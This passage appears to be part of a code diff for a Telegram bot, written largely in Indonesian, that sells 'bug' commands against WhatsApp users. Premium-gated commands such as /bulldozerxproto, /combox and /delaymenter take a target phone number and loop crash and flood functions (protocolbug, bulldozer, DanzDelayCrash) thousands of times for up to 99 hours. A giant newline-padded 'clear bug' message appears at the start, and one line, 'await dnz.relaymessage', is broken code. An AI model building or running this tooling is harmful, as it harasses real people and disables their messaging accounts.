\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝙲𝙻𝙴𝙰𝚁 𝙱𝚄𝙶"
+            });
+        }
+        ctx.reply("Done Clear Bug By Bot");
+    } catch (err) {
+        console.error("Error:", err);
+        ctx.reply("Ada kesalahan saat mengirim fix bug.");
+    }
+});
+
+bot.command('addtoken', async (ctx) => {
+    if (ctx.from.id != developerId) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /addtoken [token_bot]");
+    }
+    const newToken = args[1];
+    await addToken(newToken);
+    ctx.reply(`✅ Token berhasil ditambahkan.`);
+});
+
+bot.command('deltoken', async (ctx) => {
+    if (ctx.from.id != developerId) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /deltoken [token_bot]");
+    }
+    const tokenToDelete = args[1];
+    await deleteToken(tokenToDelete);
+    ctx.reply(`✅ Token berhasil dihapus.`);
+}); 
+
+bot.command("bulldozerxproto", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /bulldozerxproto 62xxx`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 3; i++) {
+    await DurationTrick(99, target);
+  }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
+
+bot.command("delayed", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /delaynormal 62xxx`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 2; i++) {
+    await delaydelay(99, target);
+  }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
+
+bot.command("delayquote", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /delayquote 62xxx`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 1; i++) {
+    await maker(99, target);
+    }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
+
+bot.command("delaymenter", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /delaymenter 62xxx`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 2; i++) {
+    await menter(99, target);
+  }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
+
+bot.command("combox", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /combox 62xxx`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS 1K MESSAGE`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 5000; i++) {
+    await buldozer(target, true);
+    await bulldozer(target);
+    await protocolbug3(target, true);
+    await protocolbug2(target, true);
+    await protocolbug5(target, true);
+    await DanzBroadcast(target, true);
+    await DanzDelayCrash(target)
+    await DanzInvisChat(target, Ptcp = true)
+  }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
+
+//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\
+async function DurationTrick(durationHours, target) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; 
+    const startTime = Date.now();
+    let count = 0;
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            return;
+        }
+        if (count < 5000) {
+            await protocolbug3(target, true);
+            await protocolbug2(target, true);
+            await protocolbug5(target, true);
+            await buldozer(target, true);
+            await bulldozer(target);
+            count++;
+            console.log(chalk.red(`👁️ Sending Duration 1 ${count}/5000 ke ${target}`));
+            sendNext();
+        } else {
+            console.log(chalk.green(`Success Send ${target}`));
+            count = 0; 
+            console.log(chalk.green("Next 10k Message"));
+            setTimeout(sendNext, 60000);
+        }
+    };
+    sendNext();
+};
+
+// 2
+async function delaydelay(durationHours, target) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; 
+    const startTime = Date.now();
+    let count = 0;
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            return;
+        }
+        if (count < 5000) {
+            await protocolbug2(target, true);
+            await protocolbug3(target, true);
+            await protocolbug5(target, true);
+            await protocolbug3(target, true);
+            count++;
+            console.log(chalk.red(`👁️ Sending Combo 1 ${count}/5000 ke ${target}`));
+            sendNext();
+        } else {
+            console.log(chalk.green(`Success Send ${target}`));
+            count = 0; 
+            console.log(chalk.green("Next 5k Message"));
+            setTimeout(sendNext, 60000);
+        }
+    };
+    sendNext();
+};
+
+// 3 maker
+async function maker(durationHours, target) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; 
+    const startTime = Date.now();
+    let count = 0;
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            return;
+        }
+        if (count < 5000) {
+            await buldozer(target, true);
+            await bulldozer(target);
+            await buldozer(target, true);
+            await bulldozer(target);
+            await buldozer(target, true);
+            count++;
+            console.log(chalk.red(`👁️ Sending Delay 1 ${count}/5000 ke ${target}`));
+            sendNext();
+        } else {
+            console.log(chalk.green(`Success Send ${target}`));
+            count = 0; 
+            console.log(chalk.green("Next 5k Message"));
+            setTimeout(sendNext, 60000);
+        }
+    };
+    sendNext();
+};
+
+// 3 docu
+async function menter(durationHours, target) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; 
+    const startTime = Date.now();
+    let count = 0;
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            return;
+        }
+        if (count < 5000) {
+            await DanzDelayCrash(target)
+            await DanzInvisChat(target, Ptcp = true)
+            await DanzDelayCrash(target)
+            await DanzInvisChat(target, Ptcp = true)
+            count++;
+            console.log(chalk.red(`👁️ Sending Delay 2 ${count}/5000 ke ${target}`));
+            sendNext();
+        } else {
+            console.log(chalk.green(`Success Send ${target}`));
+            count = 0; 
+            console.log(chalk.green("Next 5k Message"));
+            setTimeout(sendNext, 60000);
+        }
+    };
+    sendNext();
+};
+
+// =============== [ Func ] ================ \\
+await dnz.relaymessage
+
+// - Last Case © Danzy
+
+// ========================= [ LAUNCH BOT ] =========================
+
+(async () => {
+    if (!(await isValidToken(tokenBot))) {
+        console.error(chalk.red.bold("--------------------------------------------------"));
+        console.error(chalk.red.bold("|                 PERINGATAN !               |"));
+        console.error(chalk.red.bold("|  ANDA TERDETEKSI SEBAGAI PENYUSUP!           |"));
+        console.error(chalk.red.bold("|  Token bot yang Anda gunakan tidak terdaftar.  |"));
+        console.error(chalk.red.bold("|  Silakan hubungi developer untuk membuka akses  |"));
+        console.error(chalk.red.bold("|  mendaftarkan token Anda.                     |"));
+        console.error(chalk.red.bold("--------------------------------------------------"));
+        process.exit(1);
+    }
+    bot.launch().then(() => {
+        console.log("Running in pterodactyl");
+    });
+})();
+
